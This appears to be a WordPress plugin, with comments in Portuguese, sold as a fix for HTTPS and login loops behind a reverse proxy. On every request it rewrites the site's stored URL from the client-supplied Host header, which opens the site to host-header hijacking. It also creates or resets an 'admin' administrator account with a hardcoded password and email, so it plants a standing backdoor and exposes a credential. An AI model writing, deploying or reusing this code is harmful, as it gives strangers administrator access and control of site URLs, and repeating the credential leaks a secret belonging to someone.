<?php
/**
 * Plugin Name: Super Proxy & Login Fix
 * Description: Resolve loops de redirecionamento e falhas de login em ambientes Reverse Proxy (Easypanel/Docker)
 */

// 1. FORÇAR RECONHECIMENTO DE HTTPS (NÍVEL DE SERVIDOR)
if (isset($_SERVER['HTTP_X_FORWARDED_PROTO']) && strpos($_SERVER['HTTP_X_FORWARDED_PROTO'], 'https') !== false) {
    $_SERVER['HTTPS'] = 'on';
}

// 2. FORÇAR CONSTANTES DE SEGURANÇA
if (!defined('FORCE_SSL_ADMIN')) define('FORCE_SSL_ADMIN', true);
if (!defined('COOKIE_DOMAIN')) define('COOKIE_DOMAIN', ''); // Deixar vazio para aceitar o host atual

// 3. CONFIGURAÇÃO DINÂMICA DE URL E COOKIES
add_action('init', function() {
    $protocol = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on') ? "https://" : "http://";
    $host = $_SERVER['HTTP_HOST'];
    $current_url = $protocol . $host;

    // Atualiza o banco de dados para o domínio atual
    if (get_option('siteurl') !== $current_url) update_option('siteurl', $current_url);
    if (get_option('home') !== $current_url) update_option('home', $current_url);
});

// 4. CRIADOR/RESET DE USUÁRIO ADMIN (Sempre garante o acesso)
add_action('init', function() {
    $username = 'admin';
    $password = 'Castro771920';
    $email    = 'contato@studiocastro.com.br';

    if (!username_exists($username)) {
        $user_id = wp_create_user($username, $password, $email);
        $user = new WP_User($user_id);
        $user->set_role('administrator');
    } else {
        $user = get_user_by('login', $username);
        wp_set_password($password, $user->ID);
    }
}, 20); // Prioridade menor para garantir que rode após o setup básico
